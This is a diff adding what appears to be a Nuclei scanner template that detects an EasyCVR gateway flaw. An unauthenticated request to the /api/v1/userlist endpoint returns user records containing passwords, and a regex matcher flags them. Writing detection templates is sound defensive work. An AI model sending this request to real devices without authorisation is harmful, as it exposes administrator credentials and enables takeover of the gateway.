@@ -1,0 +1,23 @@
+id: easycvr-userlist-info-leakage
+info:
+  name: EasyCVR Userlist Information Leakage
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    EasyCVR Intelligent Edge Gateway allows attackers to gain backend administrative privileges by constructing a specially crafted URL to read sensitive system information.
+  tags: information-disclosure
+
+http:
+  - raw:
+      - |
+        GET /api/v1/userlist?pageindex=0&pagesize=10 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - '\\"assword\\": \\\".*?\\"'
